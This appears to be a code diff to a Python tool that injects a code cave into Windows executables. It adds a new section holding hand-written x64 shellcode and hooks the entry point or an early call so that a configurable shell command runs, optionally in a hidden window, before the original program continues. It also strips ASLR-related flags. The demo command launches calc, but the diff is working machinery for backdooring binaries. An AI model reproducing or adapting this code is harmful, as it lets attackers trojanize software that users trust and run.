@@ -3,14 +3,19 @@ import struct
 import os
 import sys
 
-COMMAND  = "cmd.exe /c start calc.exe"
+# --- CONFIGURATION ---
+COMMAND = "cmd.exe /c start calc"
+REPLACE_ENTRY_POINT = True
+SHOW_WINDOW = True
+SECTION_NAME = ".cave"
+# ---------------------
 
 def u64(v): return struct.pack("<Q", v)
 def u32(v): return struct.pack("<I", v)
 def u16(v): return struct.pack("<H", v)
 def align_up(val, align): return (val + align - 1) & ~(align - 1)
 
-def build_code(cave_va, original_call_va):
+def build_code(cave_va, original_call_va, show_window):
     cmd_va = cave_va + 0x200
     c = bytearray()
 
@@ -75,7 +80,10 @@ def build_code(cave_va, original_call_va):
     c += b"\x41\x8B\x04\x93"
     c += b"\x4C\x01\xC0"
 
-    c += b"\x48\x31\xD2" # rdx = 0 (SW_HIDE)
+    if show_window:
+        c += b"\x48\xC7\xC2\x05\x00\x00\x00" # mov rdx, 5 (SW_SHOW)
+    else:
+        c += b"\x48\x31\xD2"                 # xor rdx, rdx (SW_HIDE)
 
     lea_idx = len(c)
     offset = 0x200 - (lea_idx + 7)
@@ -152,39 +160,72 @@ def patch():
     struct.pack_into("<H", data, dll_char_off, dll_char & ~0x0060)
 
     ep_bytes = data[ep_offset : ep_offset + 32]
-    original_call_va = image_base + ep_rva
-    for i in range(28):
-        if ep_bytes[i] == 0xE8:
-            rel = struct.unpack("<i", ep_bytes[i+1:i+5])[0]
-            tgt = image_base + ep_rva + i + 5 + rel
-            if image_base <= tgt <= image_base + 0x10000000:
-                original_call_va = tgt
-                break
+    original_call_va = None
+    branch_offset = None
+    branch_opcode = None
+
+    if REPLACE_ENTRY_POINT:
+        branch_offset = 0
+        branch_opcode = 0xE9
+        
+        if ep_bytes[0] in (0xE8, 0xE9):
+            rel = struct.unpack("<i", ep_bytes[1:5])[0]
+            original_call_va = image_base + ep_rva + 5 + rel
+        else:
+            original_call_va = image_base + ep_rva + 5
+    else:
+        for i in range(28):
+            if ep_bytes[i] in (0xE8, 0xE9):
+                rel = struct.unpack("<i", ep_bytes[i+1:i+5])[0]
+                tgt = image_base + ep_rva + i + 5 + rel
+                
+                if image_base <= tgt <= image_base + 0x10000000:
+                    original_call_va = tgt
+                    branch_offset = i
+                    branch_opcode = ep_bytes[i]
+                    break
+
+    if branch_offset is None:
+        print("[-] Error: Could not find a valid location to hook. Try enabling REPLACE_ENTRY_POINT in config.")
+        sys.exit(1)
 
     last_sec = pe.sections[-1]
     new_rva  = align_up(last_sec.VirtualAddress + last_sec.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
     cave_va  = image_base + new_rva
 
     sec = bytearray(0x500)
-    code = build_code(cave_va, original_call_va)
+    code = build_code(cave_va, original_call_va, SHOW_WINDOW)
     
     sec[0x000:len(code)] = code
     cmd_bytes = COMMAND.encode("ascii") + b"\x00"
     sec[0x200:0x200+len(cmd_bytes)] = cmd_bytes
     
-    data, actual_cave_va = add_section(data, pe, b".cave", bytes(sec))
+    sec_name = SECTION_NAME.encode('ascii') if isinstance(SECTION_NAME, str) else SECTION_NAME
+    data, actual_cave_va = add_section(data, pe, sec_name, bytes(sec))
 
     if actual_cave_va != cave_va:
-        code = build_code(actual_cave_va, original_call_va)
+        code = build_code(actual_cave_va, original_call_va, SHOW_WINDOW)
         raw_sz = align_up(len(sec), pe.OPTIONAL_HEADER.FileAlignment)
         data[-raw_sz:-raw_sz+len(code)] = code
+
+    hook_va = image_base + ep_rva + branch_offset
+    jump_delta = actual_cave_va - (hook_va + 5)
+    
+    target_offset = ep_offset + branch_offset
+    data[target_offset] = branch_opcode
+    struct.pack_into("<i", data, target_offset + 1, jump_delta)
 
     with open(OUT_PATH, "wb") as f:
         f.write(data)
 
-    print("Code cave successfully written.")
-    print(f"Target execution address: {hex(actual_cave_va)}")
-    print(f"Output file: {OUT_PATH}")
+    print(f"[+] Code cave successfully written to section '{sec_name.decode('ascii')}'.")
+    if REPLACE_ENTRY_POINT:
+        print(f"[+] Replaced Entry Point directly at RVA: {hex(ep_rva)}")
+    else:
+        print(f"[+] Hooked instruction at RVA: {hex(ep_rva + branch_offset)}")
+    print(f"[+] Target execution address: {hex(actual_cave_va)}")
+    print(f"[+] Window State: {'SHOW' if SHOW_WINDOW else 'HIDE'}")
+    print(f"[+] Output file: {OUT_PATH}")
 
 if __name__ == "__main__":
     patch()
